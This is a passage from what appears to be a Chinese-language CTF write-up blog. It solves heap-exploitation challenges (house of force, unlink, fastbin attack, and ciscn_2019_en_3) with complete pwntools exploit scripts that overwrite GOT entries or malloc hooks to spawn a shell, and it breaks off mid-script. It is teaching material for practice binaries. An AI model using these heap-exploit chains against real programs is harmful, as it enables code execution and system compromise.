class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>add(<span class="hljs-number">0x21</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<span class="hljs-comment">#修改1的fd指针，指向main开始时申请的内存地址</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,payload)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;AAA&#x27;</span>)<br>backdoor = <span class="hljs-number">0x0400D49</span><br>add(<span class="hljs-number">0x18</span>,p64(<span class="hljs-number">0</span>)+p64(backdoor))<br>exit()<br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="unlink做法：">unlink做法：</h4><p>unlink学习：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889"> 好好说话之unlink_hollk’s blog-CSDN博客</a></p><p>本题具体步骤：</p><p>1.申请如下堆块</p><p><strong>chunk0:0x30</strong>（至少为0x30，有足够大小放入fake_chunk,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30，这里0x8(next_prev) + 0x8(next_size)不用管，用’a’填充）</p><p><strong>chunk1:0x80</strong>（至少为0x80，能分配到unsortbin）</p><p><strong>chunk2:0x20</strong>（任意大小，防止与topchunk合并）</p><p>2.在chunk0中伪造一个fake_chunk</p><p>target=存指针数组的地方</p><p>（fd与bk要满足在指针数组中构成双向链表，把指针数组看成chunk，我这边成为指针数组chunk）</p><p>fd=target-0x18#要构成双向链表，fd存的是前一个指针数组chunk的prevsize地址，而fake_chunk相对前一个指针数组chunk是后一个chunk，所以前一个指针数组chunk的fd处（即target-0x18）要为fake_chunk的addr</p><p>bk=target-0x10#与上面类似，因为是bk，所以只要填target-0x100x10</p><p>（fake_chunk与指针数组chunk构成双向链表，利用指针数组里存的fake_chunk地址绕过检查）</p><p>fake_chunk=p64(0)+p64(0x30)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=‘a’*0x10<br>fake_chunk+=p64(0x30)+p64(0x90) #溢出修改chunk1的prev_size=30,size=90</p><p><strong>chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p><p>这样写就绕过了检查，让它以为是个空闲的块</p><p>3.释放那个unsortbin大小的chunk1，触发unlink,（把fake_chunk从双向链表中摘除，但由于组成双向链表的都是指针数组chunk，他们的fd与bk重新赋值后还是在指针数组那里，而且改了同一个地方两次，最后效果就是把chunk0的指针数组地址改为了指针数组地址附近，就可以对指针数组进行chunk的操作）</p><p>4.编辑chunk0，使指针指向atoi的got表地址，泄露got表</p><p>5.计算出libc_base和system</p><p>6.编辑chunk0把got表地址改为system地址，以后要调用atoi就调用了system</p><p>7.找到程序下一个要填atoi参数的地方，填入/bin/sh\x00，开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>atoi_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(atoi_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;atoi&#x27;</span>,atoi_got)<br>base=atoi_got-obj.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>free_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_got)<br>base=free_got-obj.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="另一种faskbin-attack做法">另一种faskbin attack做法</h4><p>（用了unsortbin的一个性质）</p><p>1.申请如下chunk</p><p>2.堆溢出chunk0修改chunk1的size使其覆盖chunk1，chunk2</p><p>3.free(1)后（误使他释放到了unsortbin中），再申请回来原来的大小，就会使main_arena附近的地址跑到chunk2中</p><p>4.show一下接受chunk2里面泄露的地址addr</p><p>5.libc_base=addr-88-libc.sym[‘__malloc_hook’]-0x10</p><p>​     或 libc_base=addr-88-main_arena</p><p>（main_arena的值 ，可以去ida查看libc文件里malloc_trim函数v22变量的值）</p><p>6.og=base+og</p><p>7.释放chunk1后 堆溢出chunk0修改fd为malloc_hook-0x23</p><p>(malloc_hook-0x23是因为那边有个7f可以用来绕过chunk的检查)</p><p>8.申请两次0x60大小的chunk，第二次申请的chunk就在malloc_hook-0x23处了</p><p>9.在这个chunk把malloc_hook覆写为og</p><p>ps:有时og打不通，可用og+realloc结合的方法测试过去,</p><p>10.最后结果就是要执行malloc的话，带动malloc的hook函数实际为og，就会开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<span class="hljs-comment">#3 防止前一个释放后与topchunk合并</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>show()<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>main_arena=<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(shell)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="house-of-force做法：">house of force做法：</h4><h5 id="利用条件：">利用条件：</h5><ol><li>需要有办法能够更改到top chunk大小；</li><li>需要能够知道当前位置和要写位置的差值；</li><li>需要能够自由控制将要分配的chunk的大小，也就是malloc的参数值。</li></ol><h5 id="条件检测：">条件检测：</h5><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>1.req要小于-2*MINSIZE，一般取负值应该都能满足</p><p>2.(req) + SIZE_SZ + MALLOC_ALIGN_MASK 的值要大于MINSIZE</p><p>即申请的size要大于MINSIZE</p><h5 id="偏移测定："><strong>偏移测定：</strong></h5><p><strong>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</strong></p><p>因为size=(req) + SIZE_SZ + MALLOC_ALIGN_MASK</p><p>我们若要申请-0x60大小,参数req就要设置为</p><p>req=-0x60-SIZE_SZ- MALLOC_ALIGN_MASK</p><p>ps：这里0x60是16位对齐的，如果不对齐的话还要考虑源码中</p><p>(req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 的操作</p><p>（<strong>&amp;是按位与</strong> <strong>~是 取非）</strong></p><h5 id="本题具体步骤：">本题具体步骤：</h5><p>1.申请0x30大小堆块，查看top chunk的top指针（本题可得为0xfc7060）</p><p>2.堆溢出修改top chunk size 为0xffffffffffffffff，使得我们能申请负数大小的chunk</p><p>（size会被强转成无符号整数，负数会变为极大值）</p><p>3.我们所要修改top指针为0xfc7000，可得相差大小为-0x60</p><p>申请的参数size大小设置为-0x60-0x8-0xf</p><p>4.申请这个大小的堆块后top指针变为了0xfc7000</p><p>5.再申请堆块就会在0xfc7000的位置申请，我们这里顺便填入后门函数magic的地址</p><p>6.选用5选项本该调用gogdebye却调用了后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">magic = <span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x30</span> * <span class="hljs-string">&#x27;a&#x27;</span><br>payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>,payload)<br>offest=-(<span class="hljs-number">0x60</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">0xf</span>)<br>add(offest,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic) * <span class="hljs-number">2</span>)<br>debug()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-3">ciscn_2019_en_3</h3><h4 id="查看保护：">查看保护：</h4><p>保护全开，多了一个fortify，%n$x类型的fmt利用会被拦截</p><h4 id="大致思路：">大致思路：</h4><p>泄露libc，然后double_free改free_hook为system，开shell</p><h4 id="exp：">exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_en_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27964</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the size of story: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;please inpute the story: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>sla(<span class="hljs-string">&#x27;What\&#x27;s your name?\n&#x27;</span>,<span class="hljs-string">&#x27;nq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Please input your ID.\n&#x27;</span>,<span class="hljs-string">&#x27;pppppppp&#x27;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;setbuffer&#x27;</span>]-<span class="hljs-number">231</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span 